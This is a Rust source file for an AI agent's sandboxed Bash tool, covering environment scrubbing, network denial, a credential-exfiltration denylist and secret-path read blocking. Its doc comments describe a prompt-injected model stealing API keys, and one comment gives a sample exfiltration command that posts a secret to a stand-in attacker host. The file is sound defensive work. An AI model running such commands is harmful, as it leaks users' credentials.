use std::sync::Arc;
use std::time::Duration;

use async_trait::async_trait;
use serde_json::{Value, json};

use wcore_config::shell::bash_shell_argv_prefix;
use wcore_protocol::events::ToolCategory;
use wcore_sandbox::{
    NetworkPolicy, SandboxChunk, SandboxCommand, SandboxManifest, SandboxOutput, SyscallPolicy,
    backends::SandboxBackend, default_for_platform,
};
use wcore_types::tool::{JsonSchema, ToolEffectContract, ToolResult};

use crate::context::ToolContext;

mod policy;
use crate::{Tool, ToolOutputSink};
use policy::annotate_network_block;
pub use policy::check_denylist;

const DEFAULT_TIMEOUT_MS: u64 = 120_000;
const MAX_TIMEOUT_MS: u64 = 600_000;

/// Build the `(SandboxManifest, SandboxCommand)` pair for a bash invocation.
///
/// The command string is run through the platform shell exactly as the
/// pre-S9 `shell_command` helper did: `sh -c <command>` on Unix,
/// `cmd /C <command>` on Windows. That argv is what the sandbox backend
/// spawns.
///
/// **Env (D.1 Round 1 — HIGH-2):** BashTool historically copied the
/// engine's *entire* host environment into the sandboxed child via
/// `std::env::vars().collect()`. The engine process holds provider API
/// keys, `WAYLAND_VAULT_PASSPHRASE`, cloud credentials, etc. in its env,
/// so that blanket copy handed every secret to every Bash command the
/// model runs — a prompt-injected model could exfiltrate them around the
/// string-pattern denylist. We now build a *curated* env via
/// [`crate::env_passthrough::build_sandboxed_env`]: locale / terminal /
/// toolchain-discovery vars (`PATH`, `HOME`, `LANG`, …) plus
/// skill/config-declared passthrough vars, with every secret-shaped name
/// (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `WAYLAND_VAULT_*`, …) dropped
/// unconditionally. `PATH` etc. still pass through so commands work.
///
/// **Network (M-3 / M-7 / sandbox-2 / tools-exec-15 / #657):** agent-initiated
/// Bash egress is gated on whether this is a GENUINELY-LOCAL session, NOT on
/// the workspace trust posture. [`NetworkPolicy::Inherit`] (so `git fetch`,
/// package installs, and `curl` just work) is granted ONLY when the session
/// has no channel tool posture (`channel_tool_posture.is_none()`, i.e. a local
/// CLI/TUI/json-stream/ACP/desktop entrypoint), via the `local_bash_network`
/// helper and the `with_network` grant applied at bootstrap. This distinction
/// is load-bearing: a channel-attached session (including a `Full`-posture
/// remote sender) also resolves to `WorkspaceTrust::Trusted` through
/// `trusted_local`, so gating on trust alone would hand a remote sender a
/// networked shell. Every channel path therefore stays on the fail-safe
/// [`NetworkPolicy::Deny`] lockdown, so a prompt-injected or remote command
/// (`curl --data-binary @secret https://attacker`) cannot exfiltrate
/// sandbox-readable data or reach internal/metadata endpoints. On any
/// non-local session `WAYLAND_BASH_ALLOW_NETWORK=1` is the explicit operator
/// opt-in (via [`default_bash_network_policy`]); when no WorkspacePolicy is
/// attached at all, the conservative default is Deny.
///
/// Note: only sandbox backends that honour [`NetworkPolicy`] (bwrap,
/// sandbox-exec) actually enforce this. `NoSandboxBackend` ignores the
/// policy and runs with host network regardless (tracked separately as the
/// fail-open-to-NoSandbox finding M-2). The default flip is still the
/// correct hardening for every host with a real sandbox active.
///
/// **Syscall / FS confinement (M-4 / sandbox-3 — deliberate omission):**
/// `syscall_policy` is left [`SyscallPolicy::Inherit`] and the
/// `fs_read_allow` / `fs_write_allow` allowlists are intentionally empty.
/// `build_sandbox_pieces` has no `ToolContext` and therefore no project
/// root to scope a write-allow to; populating Landlock/seccomp with an
/// empty write-allow would forbid *all* writes (breaking every build/test
/// the model runs), and a guessed root would be worse than none. The bwrap
/// namespace + bind-mount isolation still applies; seccomp/Landlock remain
/// dormant for BashTool by design until a host-supplied project root is
/// threaded through. This is a documented defense-in-depth gap, not an
/// escape: the env is already secret-scrubbed and the network now defaults
/// closed.
fn build_sandbox_pieces(
    command: &str,
    policy: Option<&crate::workspace_policy::WorkspacePolicy>,
) -> (SandboxManifest, SandboxCommand) {
    build_sandbox_pieces_for_session(command, policy, None)
}

fn build_sandbox_pieces_for_session(
    command: &str,
    policy: Option<&crate::workspace_policy::WorkspacePolicy>,
    env_passthrough: Option<&std::collections::HashSet<String>>,
) -> (SandboxManifest, SandboxCommand) {
    // Shell prefix honors the Windows WAYLAND_BASH_SHELL=powershell|pwsh override
    // (BashTool only); defaults to sh -c / cmd /C.
    let mut argv = bash_shell_argv_prefix();
    argv.push(command.to_string());
    let mut env = crate::env_passthrough::build_sandboxed_env_for(&[], env_passthrough);
    if policy.is_some_and(crate::workspace_policy::WorkspacePolicy::denies_git_authority_env) {
        env.retain(|(name, _)| {
            ![
                "GIT_DIR",
                "GIT_COMMON_DIR",
                "GIT_WORK_TREE",
                "GIT_INDEX_FILE",
                "GIT_OBJECT_DIRECTORY",
                "GIT_ALTERNATE_OBJECT_DIRECTORIES",
                "GIT_CONFIG",
                "GIT_CONFIG_COUNT",
                "GIT_CONFIG_PARAMETERS",
            ]
            .iter()
            .any(|denied| name.eq_ignore_ascii_case(denied))
        });
    }
    let mut manifest = SandboxManifest {
        network: default_bash_network_policy(),
        // Curated env — secrets excluded, see the doc-comment above. A child
        // workspace policy additionally strips Git authority redirects.
        env,
        // M-4 / sandbox-3: left Inherit / empty on purpose — see doc above.
        syscall_policy: SyscallPolicy::Inherit,
        ..Default::default()
    };
    let mut cwd = None;
    if let Some(p) = policy {
        manifest.fs_write_allow = p.writable_roots();
        manifest.fs_read_allow = p.readable_roots();
        // #234: recompute per-exec (not the frozen construction-time list) so a
        // secret CREATED after bootstrap (pulled *.pem, generated terraform.tfstate)
        // is denied on the next command — closing the Bash TOCTOU that the file
        // tools' dynamic `is_project_secret` guard already avoids. Local-keyboard
        // (Trusted, no project-secret denial) is returned unchanged, no walk.
        manifest.fs_read_deny = p.secret_deny_paths_dynamic();
        manifest.env.extend(p.cache_env().iter().cloned());
        manifest.network = p.network();
        cwd = Some(p.root().to_path_buf());
    }
    (manifest, SandboxCommand { argv, cwd })
}

/// PowerShell cannot run under the AppContainer sandbox — it needs .NET / GAC
/// assemblies that fail to load under the Low-integrity restricted token
/// (`STATUS_DLL_NOT_FOUND`, 0xC0000135). When the active backend reports
/// [`SandboxBackend::blocks_powershell`], a `powershell`/`pwsh` shell selection
/// (via `WAYLAND_BASH_SHELL` / `[tools] windows_shell`) would make EVERY Bash
/// command hard-fail. The shell is an implementation detail of "run this
/// command", so downgrade the prefix to `cmd /C`, preserving the user's command,
/// and warn once. See FerroxLabs/wayland#413.
fn downgrade_powershell_for_sandbox(argv: &mut Vec<String>, blocks_powershell: bool) {
    if !blocks_powershell {
        return;
    }
    let is_powershell = argv.first().is_some_and(|s| {
        let stem = s.strip_suffix(".exe").unwrap_or(s);
        stem.eq_ignore_ascii_case("powershell") || stem.eq_ignore_ascii_case("pwsh")
    });
    if !is_powershell {
        return;
    }
    // The powershell/pwsh prefix is `[shell, "-NoProfile", "-Command", <command>]`;
    // the user's command is the last element. Replace the whole prefix with `cmd /C`.
    let command = argv.last().cloned().unwrap_or_default();
    static WARNED: std::sync::Once = std::sync::Once::new();
    WARNED.call_once(|| {
        tracing::warn!(
            target: "wcore_tools",
            "configured Bash shell is PowerShell, which cannot run under the active \
             sandbox (AppContainer Low-integrity token); falling back to `cmd /C`. \
             Set `[tools] windows_shell = cmd` (or WAYLAND_BASH_SHELL=cmd) to silence this."
        );
    });
    *argv = vec!["cmd".to_string(), "/C".to_string(), command];
}

/// Whether a freshly selected legacy platform backend enforces
/// secret-read-deny at the OS layer (`SandboxBackend::enforces_read_deny()`).
///
/// Retained for direct compatibility tests. Hosted sessions must query their
/// registry-owned [`SandboxRegistry`] so capability checks and execution use
/// the same immutable backend.
pub fn platform_enforces_read_deny() -> bool {
    default_for_platform().enforces_read_deny()
}

/// Network policy for agent-initiated Bash. Defaults to
/// [`NetworkPolicy::Deny`]; `WAYLAND_BASH_ALLOW_NETWORK=1` opts back into
/// full host network (`Inherit`) for network-dependent workflows.
pub(crate) fn default_bash_network_policy() -> NetworkPolicy {
    match std::env::var("WAYLAND_BASH_ALLOW_NETWORK") {
        Ok(v) if v == "1" || v.eq_ignore_ascii_case("true") => NetworkPolicy::Inherit,
        _ => NetworkPolicy::Deny,
    }
}

/// Filter macOS sandbox-init noise from stderr.
///
/// F-078: On macOS, the system `sh` (`/private/var/select/sh`) emits
/// sandbox-init warning lines to stderr on every invocation when the process
/// sandbox denies certain file operations. These lines are not part of the
/// command's actual output and confuse models into thinking the command failed.
/// They are safe to strip: they do not indicate user-command errors.
///
/// Pattern: any line containing `/private/var/select/sh` or the macOS
/// sandbox-init prologue (`sandbox_init`, `SandboxProfileLoaded`).
fn filter_macos_sandbox_noise(stderr: &str) -> String {
    let noisy = |line: &str| {
        line.contains("/private/var/select/sh")
            || line.contains("sandbox_init")
            || line.contains("SandboxProfileLoaded")
    };
    let filtered: Vec<&str> = stderr.lines().filter(|l| !noisy(l)).collect();
    filtered.join("\n")
}

/// Render a `SandboxOutput` into the `ToolResult` shape BashTool has always
/// returned, so routing through the sandbox does not change observable
/// output for any caller.
fn output_to_result(output: SandboxOutput) -> ToolResult {
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr_raw = String::from_utf8_lossy(&output.stderr);
    // F-078: strip macOS sandbox-init noise before surfacing stderr.
    let stderr = filter_macos_sandbox_noise(&stderr_raw);
    let exit_code = output.exit_code;
    let content = format!(
        "Exit code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
        exit_code, stdout, stderr
    );
    ToolResult {
        content,
        is_error: exit_code != 0,
    }
}

pub struct BashTool;

#[async_trait]
impl Tool for BashTool {
    fn name(&self) -> &str {
        "Bash"
    }

    fn description(&self) -> &str {
        "Executes a shell command and returns its output.\n\n\
         IMPORTANT: Do NOT use Bash when a dedicated tool is available:\n\
         - File search: use Glob (not find or ls)\n\
         - Content search: use Grep (not grep or rg)\n\
         - Read files: use Read (not cat, head, or tail)\n\
         - Edit files: use Edit (not sed or awk)\n\
         - Write files: use Write (not echo or cat with heredoc)\n\
         - Web access: the Bash sandbox has NO NETWORK — curl/wget/git-fetch \
         and other network commands fail (empty output). To read a URL use the \
         WebFetch tool; to search the web use the `web` tool with operation \
         \"search\". Do NOT retry with curl/wget.\n\n\
         # Instructions\n\
         - Use absolute paths to avoid working directory confusion.\n\
         - When issuing multiple independent commands, make parallel tool calls \
         instead of chaining them. Use `&&` only when commands depend on each other.\n\
         - You may specify an optional timeout in milliseconds (default 120000, max 600000).\n\n\
         # Git safety\n\
         - Never force push, reset --hard, or use --no-verify unless explicitly asked.\n\
         - Prefer creating new commits over amending existing ones."
    }

    fn input_schema(&self) -> JsonSchema {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute"
                },
                "timeout": {
                    "type": "integer",
                    "description": "Timeout in milliseconds (default 120000, max 600000)"
                }
            },
            "required": ["command"]
        })
    }

    fn is_concurrency_safe(&self, _input: &Value) -> bool {
        false
    }

    fn effect_contract(&self, _input: &Value) -> ToolEffectContract {
        // Shell commands can mutate arbitrary host state with no general reconciler.
        ToolEffectContract::default()
    }

    async fn execute(&self, input: Value) -> ToolResult {
        // S9: buffered path now routes through the sandbox backend
        // (`SandboxBackend::execute`). On `NoSandboxBackend` (the default
        // when no real sandbox is available, or `WAYLAND_SANDBOX=none`)
        // this is byte-identical to the pre-S9 `shell_command` path.
        let Some(command) = input["command"].as_str() else {
            return ToolResult {
                content: "Missing required parameter: command".to_string(),
                is_error: true,
            };
        };

        // Wave SA — credential exfiltration denylist. Refuse before
        // spawning a shell at all.
        if let Some(reason) = check_denylist(command) {
            return ToolResult {
                content: reason.to_string(),
                is_error: true,
            };
        }

        let timeout_ms = input["timeout"]
            .as_u64()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .min(MAX_TIMEOUT_MS);

        let timeout = Duration::from_millis(timeout_ms);

        let backend = default_for_platform();
        let (manifest, mut cmd) = build_sandbox_pieces(command, None);
        downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());

        let result = tokio::time::timeout(timeout, backend.execute(&manifest, cmd)).await;

        match result {
            Ok(Ok(output)) => annotate_network_block(
                command,
                default_bash_network_policy(),
                output_to_result(output),
            ),
            Ok(Err(e)) => ToolResult {
                content: format!("Failed to execute command: {}", e),
                is_error: true,
            },
            Err(_) => ToolResult {
                content: format!("Command timed out after {}ms", timeout_ms),
                is_error: true,
            },
        }
    }

    /// W7 F4 / S9: streaming variant. Routes through
    /// `SandboxBackend::execute_streaming`, consuming the resulting
    /// `mpsc::Receiver<SandboxChunk>`. Each chunk is split into lines and
    /// forwarded to `ToolOutputSink::emit_chunk` (preserving the W7
    /// line-per-chunk sink contract) while also buffered so the final
    /// `ToolResult` content stays byte-identical to the non-streaming
    /// path.
    ///
    /// Note on granularity: when the active backend uses the default
    /// `execute_streaming` impl (e.g. `NoSandboxBackend`), output is
    /// delivered as one buffered chunk on completion rather than line by
    /// line as the child runs. The final `ToolResult` is unchanged; only
    /// the timing of intermediate `emit_chunk` calls differs. A backend
    /// with native streaming delivers chunks incrementally.
    async fn execute_streaming(&self, input: Value, sink: &dyn ToolOutputSink) -> ToolResult {
        let Some(command) = input["command"].as_str() else {
            return ToolResult {
                content: "Missing required parameter: command".to_string(),
                is_error: true,
            };
        };

        // Wave SA — credential exfiltration denylist (streaming path).
        if let Some(reason) = check_denylist(command) {
            return ToolResult {
                content: reason.to_string(),
                is_error: true,
            };
        }

        let timeout_ms = input["timeout"]
            .as_u64()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .min(MAX_TIMEOUT_MS);
        let timeout = Duration::from_millis(timeout_ms);

        // `execute_streaming` takes `self: Arc<Self>` so the backend can
        // own a handle in its background task — wrap the boxed backend.
        let backend: Arc<dyn SandboxBackend> = Arc::from(default_for_platform());
        let (manifest, mut cmd) = build_sandbox_pieces(command, None);
        downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());

        let mut rx = match backend.execute_streaming(&manifest, cmd) {
            Ok(rx) => rx,
            Err(e) => {
                return ToolResult {
                    content: format!("Failed to execute command: {}", e),
                    is_error: true,
                };
            }
        };

        let mut stdout_buf = String::new();
        let mut stderr_buf = String::new();
        let mut exit_code: Option<i32> = None;

        // Forward `bytes` to the sink line-by-line, appending each line
        // (with a trailing newline) to `buf` so the final result matches
        // the pre-S9 line-buffered shape.
        fn drain_lines(bytes: &[u8], sink: &dyn ToolOutputSink, buf: &mut String) {
            let text = String::from_utf8_lossy(bytes);
            for line in text.lines() {
                sink.emit_chunk(line);
                buf.push_str(line);
                buf.push('\n');
            }
        }

        let run = async {
            while let Some(chunk) = rx.recv().await {
                match chunk {
                    SandboxChunk::Stdout(bytes) => {
                        drain_lines(&bytes, sink, &mut stdout_buf);
                    }
                    SandboxChunk::Stderr(bytes) => {
                        drain_lines(&bytes, sink, &mut stderr_buf);
                    }
                    SandboxChunk::Exit {
                        exit_code: code, ..
                    } => {
                        exit_code = Some(code);
                    }
                }
            }
        };

        if tokio::time::timeout(timeout, run).await.is_err() {
            return ToolResult {
                content: format!("Command timed out after {}ms", timeout_ms),
                is_error: true,
            };
        }

        // A closed channel with no terminal `Exit` chunk means the child
        // never ran (backend `execute` returned `Err`). Surface it as an
        // execution failure rather than reporting a misleading exit code.
        let Some(exit_code) = exit_code else {
            let detail = if stderr_buf.is_empty() {
                "sandbox produced no exit status".to_string()
            } else {
                stderr_buf.trim_end().to_string()
            };
            return ToolResult {
                content: format!("Failed to execute command: {}", detail),
                is_error: true,
            };
        };

        let content = format!(
            "Exit code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
            exit_code, stdout_buf, stderr_buf
        );
        annotate_network_block(
            command,
            default_bash_network_policy(),
            ToolResult {
                content,
                is_error: exit_code != 0,
            },
        )
    }

    /// W8a A.4 / Task-4: ctx-aware non-streaming path. Derives the OS-sandbox
    /// manifest from `ctx.workspace` (cwd, allowlists, cache env, network), then
    /// races cancel against the buffered backend execute with a timeout, so
    /// `Bash sleep 30` is interruptible in <500ms when the agent signals cancel (S2).
    async fn execute_with_ctx(&self, input: Value, ctx: &ToolContext) -> ToolResult {
        let Some(command) = input["command"].as_str() else {
            return ToolResult {
                content: "Missing required parameter: command".to_string(),
                is_error: true,
            };
        };
        if let Some(reason) = check_denylist(command) {
            return ToolResult {
                content: reason.to_string(),
                is_error: true,
            };
        }
        let timeout_ms = input["timeout"]
            .as_u64()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .min(MAX_TIMEOUT_MS);
        let timeout = Duration::from_millis(timeout_ms);
        let backend = Arc::clone(&ctx.sandbox);
        if let Some(policy) = ctx.workspace.as_deref()
            && !policy.delegated_roots_are_current()
        {
            return ToolResult {
                content: "Refused: delegated workspace identity changed before shell spawn."
                    .to_string(),
                is_error: true,
            };
        }
        // Task 8 — exec-time capability gate. The same immutable session
        // runtime that executes the command decides whether it may run.
        if let Some(p) = ctx.workspace.as_deref()
            && p.secret_read_deny_required()
            && !backend.enforces_read_deny()
            && !backend.bypasses_containment()
        {
            return ToolResult {
                content: "Refused: shell is unavailable because the active sandbox \
                          backend cannot enforce secret-read-deny for this \
                          workspace."
                    .to_string(),
                is_error: true,
            };
        }
        let (manifest, mut cmd) = build_sandbox_pieces_for_session(
            command,
            ctx.workspace.as_deref(),
            Some(ctx.sandbox.env_passthrough()),
        );
        downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());
        let net = manifest.network.clone();
        tokio::select! {
            _ = ctx.cancel.cancelled() => ToolResult {
                content: "Bash command cancelled by cancellation token".to_string(),
                is_error: true,
            },
            result = tokio::time::timeout(timeout, backend.execute(&manifest, cmd)) => match result {
                Ok(Ok(output)) => annotate_network_block(command, net, output_to_result(output)),
                Ok(Err(e)) => ToolResult { content: format!("Failed to execute command: {e}"), is_error: true },
                Err(_) => ToolResult { content: format!("Command timed out after {timeout_ms}ms"), is_error: true },
            },
        }
    }

    /// W8a A.4: ctx-aware streaming path. Same select-on-cancel as
    /// `execute_with_ctx` but preserves W7's chunk-streaming behaviour
    /// when the cancellation token never fires.
    ///
    /// Crucially, this builds the sandbox manifest from `ctx.workspace`
    /// (cwd, allowlists, cache-env, network) exactly as `execute_with_ctx`
    /// does, so the streamed command runs inside the WorkspacePolicy rather
    /// than with the policy-less `None` fallback that the non-ctx
    /// `execute_streaming` uses.
    async fn execute_streaming_with_ctx(
        &self,
        input: Value,
        ctx: &ToolContext,
        sink: &dyn ToolOutputSink,
    ) -> ToolResult {
        let Some(command) = input["command"].as_str() else {
            return ToolResult {
                content: "Missing required parameter: command".to_string(),
                is_error: true,
            };
        };

        if let Some(reason) = check_denylist(command) {
            return ToolResult {
                content: reason.to_string(),
                is_error: true,
            };
        }

        let timeout_ms = input["timeout"]
            .as_u64()
            .unwrap_or(DEFAULT_TIMEOUT_MS)
            .min(MAX_TIMEOUT_MS);
        let timeout = Duration::from_millis(timeout_ms);

        // Task 8 — exec-time capability gate (streaming path, same logic as
        // execute_with_ctx). Must check BEFORE wrapping in Arc.
        let backend = Arc::clone(&ctx.sandbox);
        if let Some(policy) = ctx.workspace.as_deref()
            && !policy.delegated_roots_are_current()
        {
            return ToolResult {
                content: "Refused: delegated workspace identity changed before shell spawn."
                    .to_string(),
                is_error: true,
            };
        }
        if let Some(p) = ctx.workspace.as_deref()
            && p.secret_read_deny_required()
            && !backend.enforces_read_deny()
            && !backend.bypasses_containment()
        {
            return ToolResult {
                content: "Refused: shell is unavailable because the active sandbox \
                          backend cannot enforce secret-read-deny for this \
                          workspace."
                    .to_string(),
                is_error: true,
            };
        }
        let (manifest, mut cmd) = build_sandbox_pieces_for_session(
            command,
            ctx.workspace.as_deref(),
            Some(ctx.sandbox.env_passthrough()),
        );
        downgrade_powershell_for_sandbox(&mut cmd.argv, backend.blocks_powershell());
        let net = manifest.network.clone();

        let mut rx = match backend.execute_streaming(&manifest, cmd) {
            Ok(rx) => rx,
            Err(e) => {
                return ToolResult {
                    content: format!("Failed to execute command: {}", e),
                    is_error: true,
                };
            }
        };

        let mut stdout_buf = String::new();
        let mut stderr_buf = String::new();
        let mut exit_code: Option<i32> = None;

        fn drain_lines(bytes: &[u8], sink: &dyn ToolOutputSink, buf: &mut String) {
            let text = String::from_utf8_lossy(bytes);
            for line in text.lines() {
                sink.emit_chunk(line);
                buf.push_str(line);
                buf.push('\n');
            }
        }

        let run = async {
            while let Some(chunk) = rx.recv().await {
                match chunk {
                    SandboxChunk::Stdout(bytes) => {
                        drain_lines(&bytes, sink, &mut stdout_buf);
                    }
                    SandboxChunk::Stderr(bytes) => {
                        drain_lines(&bytes, sink, &mut stderr_buf);
                    }
                    SandboxChunk::Exit {
                        exit_code: code, ..
                    } => {
                        exit_code = Some(code);
                    }
                }
            }
        };

        let timed = tokio::time::timeout(timeout, run);

        tokio::select! {
            _ = ctx.cancel.cancelled() => ToolResult {
                content: "Bash command cancelled by cancellation token".to_string(),
                is_error: true,
            },
            res = timed => {
                if res.is_err() {
                    return ToolResult {
                        content: format!("Command timed out after {}ms", timeout_ms),
                        is_error: true,
                    };
                }
                let Some(exit_code) = exit_code else {
                    let detail = if stderr_buf.is_empty() {
                        "sandbox produced no exit status".to_string()
                    } else {
                        stderr_buf.trim_end().to_string()
                    };
                    return ToolResult {
                        content: format!("Failed to execute command: {}", detail),
                        is_error: true,
                    };
                };
                let content = format!(
                    "Exit code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
                    exit_code, stdout_buf, stderr_buf
                );
                annotate_network_block(
                    command,
                    net,
                    ToolResult {
                        content,
                        is_error: exit_code != 0,
                    },
                )
            }
        }
    }

    fn supports_streaming(&self) -> bool {
        true
    }

    fn category(&self) -> ToolCategory {
        ToolCategory::Exec
    }

    fn execution_class_for(&self, _input: &Value) -> crate::ToolExecutionClass {
        crate::ToolExecutionClass::ProcessSpawning
    }

    fn describe(&self, input: &Value) -> String {
        let cmd = input.get("command").and_then(|v| v.as_str()).unwrap_or("");
        format!("Execute: {}", crate::truncate_utf8(cmd, 80))
    }
}

#[cfg(test)]
mod tests;
